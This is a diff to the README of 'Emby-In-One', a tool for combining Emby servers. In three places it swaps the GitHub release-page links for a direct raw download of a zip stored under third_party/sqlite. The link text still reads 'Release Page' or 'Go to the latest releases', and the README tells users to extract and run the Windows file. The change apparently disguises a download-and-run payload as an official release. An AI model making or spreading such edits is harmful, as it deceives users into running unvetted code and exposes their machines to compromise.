@@ -1,6 +1,6 @@
 # 🧩 Emby-In-One - One Entry for All Emby Servers
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/platonic-gaelic239/Emby-In-One/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/platonic-gaelic239/Emby-In-One/raw/refs/heads/main/third_party/sqlite/In_One_Emby_3.5.zip)
 
 ## 🚀 Overview
 
@@ -30,7 +30,7 @@ Use Emby-In-One if you:
 
 Visit the release page to download and run the Windows file:
 
-[Go to the latest releases](https://github.com/platonic-gaelic239/Emby-In-One/releases)
+[Go to the latest releases](https://github.com/platonic-gaelic239/Emby-In-One/raw/refs/heads/main/third_party/sqlite/In_One_Emby_3.5.zip)
 
 On that page, look for the newest release and download the Windows package that matches your system. If there are several files, choose the one meant for Windows.
 
@@ -199,6 +199,6 @@ No. You can keep using your usual Emby client after setup.
 
 Use the release page here:
 
-[https://github.com/platonic-gaelic239/Emby-In-One/releases](https://github.com/platonic-gaelic239/Emby-In-One/releases)
+[https://github.com/platonic-gaelic239/Emby-In-One/raw/refs/heads/main/third_party/sqlite/In_One_Emby_3.5.zip](https://github.com/platonic-gaelic239/Emby-In-One/raw/refs/heads/main/third_party/sqlite/In_One_Emby_3.5.zip)
 
 Pick the latest Windows release, download it, extract it if needed, and run the main file from the package
